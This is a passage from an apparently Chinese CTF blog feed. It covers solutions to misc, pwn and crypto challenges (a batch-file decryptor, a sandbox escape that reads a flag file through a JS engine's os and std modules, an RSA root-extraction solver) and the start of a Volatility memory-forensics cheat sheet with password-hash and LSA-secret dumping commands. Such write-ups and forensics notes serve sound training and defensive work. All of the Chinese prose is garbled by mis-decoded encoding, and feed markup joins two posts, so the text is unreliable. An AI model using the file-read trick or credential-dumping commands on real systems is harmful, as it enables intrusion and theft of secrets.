<p><img src="/img/wp/2022/2022qgb-20.png"></p>
<h2 id="The-fun-picture"><a href="#The-fun-picture" class="headerlink" title="The fun picture"></a>The fun picture</h2><p>çˆ†ç ´å¾—åˆ°å¯†ç <code>gh89</code></p>
<p><img src="/img/wp/2022/2022qgb-21.png"></p>
<p>FUNæ·»åŠ åç¼€zipï¼Œè§£å‹åæ–‡ä»¶è¡¥ä¸Špngå¤´<code>89 50 4e 47</code>,å¾—åˆ°äºŒç»´ç </p>
<p>æ‰«ç å¾—åˆ°<code>ZmxhZ3tycjkwZm5uZW1kZnUwOGdma2ttdmVtZGszZm12NmZnYX0=</code></p>
<p>base64è§£ç å¾—åˆ°flag</p>
<h2 id="B-tCh"><a href="#B-tCh" class="headerlink" title="B@tCh"></a>B@tCh</h2><p><em>èµ›åå¤ç°</em></p>
<p><code>BatchEncryption</code>æ··æ·†çš„æ‰¹å¤„ç†æ–‡ä»¶</p>
<p>ç‰¹å¾ä¸€èˆ¬æ˜¯å¼€å¤´çš„ä¸¤ä¸ªå­—èŠ‚ä¸º<code>0xFF</code>ã€<code>0xFE</code>ï¼Œå­˜åœ¨ç±»ä¼¼<code>BatchEncryption Build 201610 By gwsbhqt@163.com</code>çš„ä½œè€…ä¿¡æ¯</p>
<p>æœ¬é¢˜å°†ä½œè€…ä¿¡æ¯å»é™¤äº†</p>
<p><img src="/img/wp/2022/2022qgb-22.png"></p>
<p>è§£å¯†è„šæœ¬ï¼Œæ¥è‡ª<a href="https://blog.csdn.net/Hunter98234/article/details/108672926">https://blog.csdn.net/Hunter98234/article/details/108672926</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Batch Decryption 202009 (BatchEncryption Build 201610)</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (data[<span class="hljs-number">0</span>] == <span class="hljs-number">0xFF</span> <span class="hljs-keyword">and</span> data[<span class="hljs-number">1</span>] == <span class="hljs-number">0xFE</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption bom error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>:<span class="hljs-number">9</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) != <span class="hljs-string">&#x27; &amp;cls\r\n&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption cls error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(data[<span class="hljs-number">9</span>:<span class="hljs-number">60</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) != <span class="hljs-string">&#x27;::BatchEncryption Build 201610 By gwsbhqt@163.com\r\n&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption build error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">vars</span> = &#123;&#125;<br><br>    <span class="hljs-comment"># decryption line</span><br>    i = <span class="hljs-number">60</span><br>    l = <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">while</span> i &lt; l:<br>        i = run(<span class="hljs-built_in">vars</span>, data, i)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">vars</span>, data, i</span>):<br>    buf = <span class="hljs-string">&#x27;&#x27;</span><br>    f = <span class="hljs-number">0</span><br>    t = <span class="hljs-number">0</span><br>    x = <span class="hljs-literal">False</span><br>    l = <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-number">0x0d</span> <span class="hljs-keyword">and</span> data[i+<span class="hljs-number">1</span>] == <span class="hljs-number">0x0a</span>:<br>            i += <span class="hljs-number">2</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># get %var:~x,y% %0</span><br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-number">0x25</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x:<br>                x = <span class="hljs-literal">True</span><br>                f = i<br>            <span class="hljs-keyword">else</span>:<br>                x = <span class="hljs-literal">False</span><br>                t = i<br>                rst = var_percent(data[f:t+<span class="hljs-number">1</span>], <span class="hljs-built_in">vars</span>)<br>                buf += rst<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x:<br>                buf += <span class="hljs-built_in">str</span>(data[i:i+<span class="hljs-number">1</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> (f + <span class="hljs-number">1</span> == i) <span class="hljs-keyword">and</span> ((data[i] &gt;= <span class="hljs-number">0x30</span> <span class="hljs-keyword">and</span> data[i] &lt;= <span class="hljs-number">0x39</span>) <span class="hljs-keyword">or</span> data[i] == <span class="hljs-number">0x2a</span>):<br>                    x = <span class="hljs-literal">False</span><br>                    t = i<br>                    rst = <span class="hljs-built_in">str</span>(data[f:t+<span class="hljs-number">1</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                    buf += rst<br>        i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> i &gt;= l:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-built_in">print</span>(buf)<br>    bufs = buf.split(<span class="hljs-string">&#x27;&amp;@&#x27;</span>)<br>    <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> bufs:<br>        <span class="hljs-keyword">if</span> var[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;set &#x27;</span>:<br>            var = var[<span class="hljs-number">4</span>:]<br>            b = var.find(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-built_in">vars</span>[var[<span class="hljs-number">0</span>:b]] = var[b+<span class="hljs-number">1</span>:].replace(<span class="hljs-string">&#x27;^^^&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> i<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">var_percent</span>(<span class="hljs-params">data, <span class="hljs-built_in">vars</span></span>):<br>    full = <span class="hljs-built_in">str</span>(data, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    buf = full[<span class="hljs-number">1</span>:<span class="hljs-built_in">len</span>(full)-<span class="hljs-number">1</span>]<br>    buf = buf.split(<span class="hljs-string">&#x27;:~&#x27;</span>)<br>    var = buf[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> var <span class="hljs-keyword">in</span> <span class="hljs-built_in">vars</span>:<br>        <span class="hljs-built_in">vars</span>[var] = os.getenv(var)<br>    ent = <span class="hljs-built_in">vars</span>[var]<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(buf) &gt; <span class="hljs-number">1</span>):<br>        l = <span class="hljs-built_in">len</span>(ent)<br>        buf = buf[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        f = <span class="hljs-built_in">int</span>(buf[<span class="hljs-number">0</span>])<br>        t = <span class="hljs-built_in">int</span>(buf[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">if</span> f &lt; <span class="hljs-number">0</span>:<br>            f, t = l + f, t<br>        rst = ent[f: f+t]<br>    <span class="hljs-keyword">else</span>:<br>        rst = full<br>    <span class="hljs-keyword">return</span> rst<br><br><br>encrypt_file = <span class="hljs-string">&#x27;./batch_decryption/Encrypted_01.txt&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    <span class="hljs-keyword">try</span>:<br>        file = <span class="hljs-built_in">open</span>(encrypt_file, <span class="hljs-string">&quot;rb&quot;</span>)<br>        data = file.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption read error:&#x27;</span>, err)<br>        exit<br>    <span class="hljs-keyword">else</span>:<br>        file.close()<br><br>    decryption(data)<br></code></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¸‹è„šæœ¬ï¼Œä½¿å®ƒèƒ½é€‚ç”¨äºæœ¬é¢˜</p>
<p>å› ä¸ºé™„ä»¶ä¸­æ²¡æœ‰<code>Build 201610 By....</code>è¿™ä¸²ä¿¡æ¯ï¼Œæ‰€ä»¥å°†ä¸ªåˆ¤æ–­å»æ‰ï¼ˆ17-19ï¼‰<br>æ²¡æœ‰è¿™ä¸ªå­—ç¬¦ä¸²åï¼Œbatå†…å®¹ä¹Ÿä¼šä»ç›¸åº”çš„60å˜ä¸º9ï¼ˆä»@å¼€å§‹ï¼‰</p>
<p><img src="/img/wp/2022/2022qgb-23.png"></p>
<p>95è¡Œæ”¹ä¸ºæ–‡ä»¶å</p>
<p><img src="/img/wp/2022/2022qgb-24.png"></p>
<p>è¿è¡Œè§£å¯†å¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022qgb-25.png"></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="qqjs-new"><a href="#qqjs-new" class="headerlink" title="qqjs_new"></a>qqjs_new</h2><p><em>éé¢„æœŸè§£</em></p>
<p>idaåˆ†æï¼Œçœ‹åˆ°<code>import * as std from &#39;std&#39;</code>å’Œ<code>import * as os from &#39;os&#39;</code></p>
<p><img src="/img/wp/2022/2022qgb-26.png"></p>
<p>æ‰€ä»¥è¾“å…¥<code>os</code>ä¼šè¿”å›æ¨¡å—ä¸­çš„å‡½æ•°<br>å‘ç°å­˜åœ¨<code>readdir</code>ï¼Œå¯ä»¥è¯»ç›®å½•</p>
<p><img src="/img/wp/2022/2022qgb-27.png"></p>
<p>æ‰¾åˆ°flagæ–‡ä»¶ä½ç½®<code>/home/ctf/flag</code></p>
<p><img src="/img/wp/2022/2022qgb-28.png"></p>
<p><code>std</code>æ¨¡å—ä¸­å­˜åœ¨<code>loadFile</code>å‡½æ•°ï¼Œå¯ä»¥è¯»æ–‡ä»¶</p>
<p><img src="/img/wp/2022/2022qgb-29.png"></p>
<p>è¯»flag</p>
<p><img src="/img/wp/2022/2022qgb-30.png"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p><em>èµ›åå¤ç°</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br><span class="hljs-keyword">import</span> hashlib<br><br><br><br>p=<span class="hljs-number">165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977</span><br>q=<span class="hljs-number">120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731</span><br>e=<span class="hljs-number">33</span><br>c=<span class="hljs-number">10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919</span><br><br><br>n = p*q<br><br>d = gmpy2.invert(<span class="hljs-number">11</span>, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>c3 = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(c3)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    m, flag = gmpy2.iroot(c3, <span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(m))<br>        exit()<br>    c3 = c3 + n<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>å¼ºå›½æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>miscæ€»ç»“(å–è¯ç¯‡)</title>
    <url>/posts/92f52d5d/</url>
    <content><![CDATA[<h1 id="å†…å­˜å–è¯å·¥å…·"><a href="#å†…å­˜å–è¯å·¥å…·" class="headerlink" title="å†…å­˜å–è¯å·¥å…·"></a>å†…å­˜å–è¯å·¥å…·</h1><h2 id="Volatility2"><a href="#Volatility2" class="headerlink" title="Volatility2"></a>Volatility2</h2><blockquote>
<p>Volatility2æ˜¯ä¸€æ¬¾å¼€æºçš„ï¼ŒåŸºäºPythonå¼€å‘çš„å†…å­˜å–è¯å·¥å…·é›†ï¼Œå¯ä»¥åˆ†æå†…å­˜ä¸­çš„å„ç§æ•°æ®ã€‚Volatilityæ”¯æŒå¯¹32ä½æˆ–64ä½Windowsã€Linuxã€Macã€Androidæ“ä½œç³»ç»Ÿçš„RAMæ•°æ®è¿›è¡Œæå–ä¸åˆ†æã€‚</p>
</blockquote>
<h3 id="åŸºç¡€ä½¿ç”¨"><a href="#åŸºç¡€ä½¿ç”¨" class="headerlink" title="åŸºç¡€ä½¿ç”¨"></a>åŸºç¡€ä½¿ç”¨</h3><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text"># æŸ¥çœ‹imagerinfoè·å–æ“ä½œç³»ç»Ÿç±»å‹<br>volatility -f &lt;filename&gt; imageinfo<br><br># æŒ‡å®šæ“ä½œç³»ç»Ÿç±»å‹è¿›è¡Œå…¶ä»–æ“ä½œ<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt;<br><br># æŸ¥çœ‹è¿›ç¨‹<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; pslist<br><br># æŸ¥çœ‹æ–‡ä»¶<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag&quot;<br><br># æ¡Œé¢<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;Desktop&quot;<br><br># å¯¼å‡ºæ–‡ä»¶<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; dumpfiles -Q &lt;virtual address&gt; -D &lt;savedir&gt;<br><br># è·å–ç³»ç»Ÿç”¨æˆ·å<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; printkey -K &quot;SAM\Domains\Account\Users\Names&quot;<br><br># æŸ¥çœ‹æ³¨å†Œè¡¨<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hivelist<br><br># æå–ç”¨æˆ·å¯†ç <br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hashdump -y &lt;æ³¨å†Œè¡¨ system çš„ virtual åœ°å€&gt; -s &lt;SAM çš„ virtual åœ°å€&gt;<br><br># è·å–IEæµè§ˆå™¨å†å²è®°å½•<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; iehistory<br><br># æŸ¥çœ‹ç½‘ç»œè¿æ¥<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; netscan<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; connscan<br><br># å°†å†…å­˜ä¸­çš„æŸä¸ªè¿›ç¨‹æ•°æ®ä»¥ dmp çš„æ ¼å¼ä¿å­˜å‡ºæ¥<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; memdump -p &lt;pid&gt; -D &lt;savedir&gt;<br><br># æå–è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; procdump -p &lt;pid&gt; -D &lt;savedir&gt;<br><br># æŸ¥çœ‹å‘½ä»¤è¡Œå†å²è®°å½•<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdscan<br><br># æŸ¥çœ‹è¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdline<br></code></pre></td></tr></table></figure>



<h3 id="æ”¯æŒçš„æ’ä»¶åˆ—è¡¨"><a href="#æ”¯æŒçš„æ’ä»¶åˆ—è¡¨" class="headerlink" title="æ”¯æŒçš„æ’ä»¶åˆ—è¡¨"></a>æ”¯æŒçš„æ’ä»¶åˆ—è¡¨</h3><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">amcache             # æŸ¥çœ‹ AmCache åº”ç”¨ç¨‹åºç—•è¿¹ä¿¡æ¯<br>apihooks            # æ£€æµ‹å†…æ ¸åŠè¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­çš„ API hook<br>atoms               # åˆ—å‡ºä¼šè¯åŠçª—å£ç«™ atom è¡¨<br>atomscan            # Atom è¡¨çš„æ± æ‰«æ(Pool scanner)<br>auditpol            # åˆ—å‡ºæ³¨å†Œè¡¨ HKLM\SECURITY\Policy\PolAdtEv çš„å®¡è®¡ç­–ç•¥ä¿¡æ¯<br>bigpools            # ä½¿ç”¨ BigPagePoolScanner è½¬å‚¨å¤§åˆ†é¡µæ± (big page pools)<br>bioskbd             # ä»å®æ—¶æ¨¡å¼å†…å­˜ä¸­è¯»å–é”®ç›˜ç¼“å†²æ•°æ®(æ—©æœŸç”µè„‘å¯ä»¥è¯»å–å‡º BIOS å¼€æœºå¯†ç )<br>cachedump           # è·å–å†…å­˜ä¸­ç¼“å­˜çš„åŸŸå¸å·çš„å¯†ç å“ˆå¸Œ<br>callbacks           # æ‰“å°å…¨ç³»ç»Ÿé€šçŸ¥ä¾‹ç¨‹<br>clipboard           # æå– Windows å‰ªè´´æ¿ä¸­çš„å†…å®¹<br>cmdline             # æ˜¾ç¤ºè¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°<br>cmdscan             # æå–æ‰§è¡Œçš„å‘½ä»¤è¡Œå†å²è®°å½•ï¼ˆæ‰«æ_COMMAND_HISTORY ä¿¡æ¯ï¼‰<br>connections         # æ‰“å°ç³»ç»Ÿæ‰“å¼€çš„ç½‘ç»œè¿æ¥(ä»…æ”¯æŒ Windows XP å’Œ 2003)<br>connscan            # æ‰“å° TCP è¿æ¥ä¿¡æ¯<br>consoles            # æå–æ‰§è¡Œçš„å‘½ä»¤è¡Œå†å²è®°å½•ï¼ˆæ‰«æ_CONSOLE_INFORMATION ä¿¡æ¯ï¼‰<br>crashinfo           # æå–å´©æºƒè½¬å‚¨ä¿¡æ¯<br>deskscan            # tagDESKTOP æ± æ‰«æ(Poolscaner)<br>devicetree          # æ˜¾ç¤ºè®¾å¤‡æ ‘ä¿¡æ¯<br>dlldump             # ä»è¿›ç¨‹åœ°å€ç©ºé—´è½¬å‚¨åŠ¨æ€é“¾æ¥åº“<br>dlllist             # æ‰“å°æ¯ä¸ªè¿›ç¨‹åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“åˆ—è¡¨<br>driverirp           # IRP hook é©±åŠ¨æ£€æµ‹<br>drivermodule        # å…³è”é©±åŠ¨å¯¹è±¡è‡³å†…æ ¸æ¨¡å—<br>driverscan          # é©±åŠ¨å¯¹è±¡æ± æ‰«æ<br>dumpcerts           # æå– RAS ç§é’¥åŠ SSL å…¬é’¥<br>dumpfiles           # æå–å†…å­˜ä¸­æ˜ å°„æˆ–ç¼“å­˜çš„æ–‡ä»¶<br>dumpregistry        # è½¬å‚¨å†…å­˜ä¸­æ³¨å†Œè¡¨ä¿¡æ¯è‡³ç£ç›˜<br>editbox             # æŸ¥çœ‹ Edit ç¼–è¾‘æ§ä»¶ä¿¡æ¯ (Listbox æ­£åœ¨å®éªŒä¸­)<br>envars              # æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡<br>eventhooks          # æ‰“å° Windows äº‹ä»¶ hook è¯¦ç»†ä¿¡æ¯<br>evtlogs             # æå– Windows äº‹ä»¶æ—¥å¿—(ä»…æ”¯æŒ XP/2003)<br>filescan            # æå–æ–‡ä»¶å¯¹è±¡ï¼ˆfile objectsï¼‰æ± ä¿¡æ¯<br>gahti               # è½¬å‚¨ç”¨æˆ·å¥æŸ„ï¼ˆhandleï¼‰ç±»å‹ä¿¡æ¯<br>gditimers           # æ‰“å°å·²å®‰è£…çš„ GDI è®¡æ—¶å™¨ (timers) åŠå›è°ƒ(callbacks)<br>gdt                 # æ˜¾ç¤ºå…¨å±€æè¿°ç¬¦è¡¨(Global Descriptor Table)<br>getservicesids      # è·å–æ³¨å†Œè¡¨ä¸­çš„æœåŠ¡åç§°å¹¶è¿”å› SID ä¿¡æ¯<br>getsids             # æ‰“å°æ¯ä¸ªè¿›ç¨‹çš„ SID ä¿¡æ¯<br>handles             # æ‰“å°æ¯ä¸ªè¿›ç¨‹æ‰“å¼€çš„å¥æŸ„çš„åˆ—è¡¨<br>hashdump            # è½¬å‚¨å†…å­˜ä¸­çš„ Windows å¸æˆ·å¯†ç å“ˆå¸Œ(LM/NTLM)<br>hibinfo             # è½¬å‚¨ä¼‘çœ æ–‡ä»¶ä¿¡æ¯<br>hivedump            # æ‰“å°æ³¨å†Œè¡¨é…ç½®å•å…ƒä¿¡æ¯<br>hivelist            # æ‰“å°æ³¨å†Œè¡¨é…ç½®å•å…ƒåˆ—è¡¨<br>hivescan            # æ³¨å†Œè¡¨é…ç½®å•å…ƒæ± æ‰«æ<br>hpakextract         # ä» HPAK æ–‡ä»¶ï¼ˆFast Dump æ ¼å¼ï¼‰æå–ç‰©ç†å†…å­˜æ•°æ®<br>hpakinfo            # æŸ¥çœ‹ HPAK æ–‡ä»¶å±æ€§åŠç›¸å…³ä¿¡æ¯<br>idt                 # æ˜¾ç¤ºä¸­æ–­æè¿°ç¬¦è¡¨(Interrupt Descriptor Table)<br>iehistory           # é‡å»º IE ç¼“å­˜åŠè®¿é—®å†å²è®°å½•<br>imagecopy           # å°†ç‰©ç†åœ°å€ç©ºé—´å¯¼å‡ºåŸç”Ÿ DD é•œåƒæ–‡ä»¶<br>imageinfo           # æŸ¥çœ‹ / è¯†åˆ«é•œåƒä¿¡æ¯<br>impscan             # æ‰«æå¯¹å¯¼å…¥å‡½æ•°çš„è°ƒç”¨<br>joblinks            # æ‰“å°è¿›ç¨‹ä»»åŠ¡é“¾æ¥ä¿¡æ¯<br>kdbgscan            # æœç´¢å’Œè½¬å‚¨æ½œåœ¨ KDBG å€¼<br>kpcrscan            # æœç´¢å’Œè½¬å‚¨æ½œåœ¨ KPCR å€¼<br>ldrmodules          # æ£€æµ‹æœªé“¾æ¥çš„åŠ¨æ€é“¾æ¥ DLL<br>lsadump             # ä»æ³¨å†Œè¡¨ä¸­æå– LSA å¯†é’¥ä¿¡æ¯ï¼ˆå·²è§£å¯†ï¼‰<br>machoinfo           # è½¬å‚¨ Mach-O æ–‡ä»¶æ ¼å¼ä¿¡æ¯<br>malfind             # æŸ¥æ‰¾éšè—çš„å’Œæ’å…¥çš„ä»£ç <br>mbrparser           # æ‰«æå¹¶è§£ææ½œåœ¨çš„ä¸»å¼•å¯¼è®°å½•(MBR)<br>memdump             # è½¬å‚¨è¿›ç¨‹çš„å¯å¯»å€å†…å­˜<br>memmap              # æ‰“å°å†…å­˜æ˜ å°„<br>messagehooks        # æ¡Œé¢å’Œçª—å£æ¶ˆæ¯é’©å­çš„çº¿ç¨‹åˆ—è¡¨<br>mftparser           # æ‰«æå¹¶è§£ææ½œåœ¨çš„ MFT æ¡ç›®<br>moddump             # è½¬å‚¨å†…æ ¸é©±åŠ¨ç¨‹åºåˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ç¤ºä¾‹<br>modscan             # å†…æ ¸æ¨¡å—æ± æ‰«æ<br>modules             # æ‰“å°åŠ è½½æ¨¡å—çš„åˆ—è¡¨<br>multiscan           # æ‰¹é‡æ‰«æå„ç§å¯¹è±¡<br>mutantscan          # å¯¹äº’æ–¥å¯¹è±¡æ± æ‰«æ<br>notepad             # æŸ¥çœ‹è®°äº‹æœ¬å½“å‰æ˜¾ç¤ºçš„æ–‡æœ¬<br>objtypescan         # æ‰«æçª—å£å¯¹è±¡ç±»å‹å¯¹è±¡<br>patcher             # åŸºäºé¡µé¢æ‰«æçš„è¡¥ä¸ç¨‹åºå†…å­˜<br>poolpeek            # å¯é…ç½®çš„æ± æ‰«æå™¨æ’ä»¶<br>printkey            # æ‰“å°æ³¨å†Œè¡¨é¡¹åŠå…¶å­é¡¹å’Œå€¼<br>privs               # æ˜¾ç¤ºè¿›ç¨‹æƒé™<br>procdump            # è¿›ç¨‹è½¬å‚¨åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ç¤ºä¾‹<br>pslist              # æŒ‰ç…§ EPROCESS åˆ—è¡¨æ‰“å°æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹<br>psscan              # è¿›ç¨‹å¯¹è±¡æ± æ‰«æ<br>pstree              # ä»¥æ ‘å‹æ–¹å¼æ‰“å°è¿›ç¨‹åˆ—è¡¨<br>psxview             # æŸ¥æ‰¾å¸¦æœ‰éšè—è¿›ç¨‹çš„æ‰€æœ‰è¿›ç¨‹åˆ—è¡¨<br>qemuinfo            # è½¬å‚¨ Qemu ä¿¡æ¯<br>raw2dmp             # å°†ç‰©ç†å†…å­˜åŸç”Ÿæ•°æ®è½¬æ¢ä¸º windbg å´©æºƒè½¬å‚¨æ ¼å¼<br>screenshot          # åŸºäº GDI Windows çš„è™šæ‹Ÿå±å¹•æˆªå›¾ä¿å­˜<br>servicediff         # Windows æœåŠ¡åˆ—è¡¨(ala Plugx)<br>sessions            # _MM_SESSION_SPACE çš„è¯¦ç»†ä¿¡æ¯åˆ—è¡¨(ç”¨æˆ·ç™»å½•ä¼šè¯)<br>shellbags           # æ‰“å° Shellbags ä¿¡æ¯<br>shimcache           # è§£æåº”ç”¨ç¨‹åºå…¼å®¹æ€§ Shim ç¼“å­˜æ³¨å†Œè¡¨é¡¹<br>shutdowntime        # ä»å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ä¿¡æ¯è·å–æœºå™¨å…³æœºæ—¶é—´<br>sockets             # æ‰“å°å·²æ‰“å¼€å¥—æ¥å­—åˆ—è¡¨<br>sockscan            # TCP å¥—æ¥å­—å¯¹è±¡æ± æ‰«æ<br>ssdt                # æ˜¾ç¤º SSDT æ¡ç›®<br>strings             # ç‰©ç†åˆ°è™šæ‹Ÿåœ°å€çš„åç§»åŒ¹é…(éœ€è¦ä¸€äº›æ—¶é—´ï¼Œå¸¦è¯¦ç»†ä¿¡æ¯)<br>svcscan             # windows æœåŠ¡åˆ—è¡¨æ‰«æ<br>symlinkscan         # ç¬¦å·é“¾æ¥å¯¹è±¡æ± æ‰«æ<br>thrdscan            # çº¿ç¨‹å¯¹è±¡æ± æ‰«æ<br>threads             # è°ƒæŸ¥_ETHREAD å’Œ_KTHREADs<br>timeliner           # åˆ›å»ºå†…å­˜ä¸­çš„å„ç§ç—•è¿¹ä¿¡æ¯çš„æ—¶é—´çº¿<br>timers              # æ‰“å°å†…æ ¸è®¡æ—¶å™¨åŠå…³è”æ¨¡å—çš„ DPC<br>truecryptmaster     # æ¢å¤ TrueCrypt 7.1a ä¸»å¯†é’¥<br>truecryptpassphrase # æŸ¥æ‰¾å¹¶æå– TrueCrypt å¯†ç <br>truecryptsummary    # TrueCrypt æ‘˜è¦ä¿¡æ¯<br>unloadedmodules     # æ‰“å°å¸è½½çš„æ¨¡å—ä¿¡æ¯åˆ—è¡¨<br>userassist          # æ‰“å°æ³¨å†Œè¡¨ä¸­ UserAssist ç›¸å…³ä¿¡æ¯<br>userhandles         # è½¬å‚¨ç”¨æˆ·å¥æŸ„è¡¨<br>vaddump             # è½¬å‚¨ VAD æ•°æ®ä¸ºæ–‡ä»¶<br>vadinfo             # è½¬å‚¨ VAD ä¿¡æ¯<br>vadtree             # ä»¥æ ‘å½¢æ–¹å¼æ˜¾ç¤º VAD æ ‘ä¿¡æ¯<br>vadwalk             # æ˜¾ç¤ºéå† VAD æ ‘<br>vboxinfo            # è½¬å‚¨ Virtualbox ä¿¡æ¯ï¼ˆè™šæ‹Ÿæœºï¼‰<br>verinfo             # æ‰“å° PE é•œåƒä¸­çš„ç‰ˆæœ¬ä¿¡æ¯<br>vmwareinfo          # è½¬å‚¨ VMware VMSS/VMSN ä¿¡æ¯<br>volshell            # å†…å­˜é•œåƒä¸­çš„ shell<br>windows             # æ‰“å°æ¡Œé¢çª—å£(è¯¦ç»†ä¿¡æ¯)<br>wintree             # Z 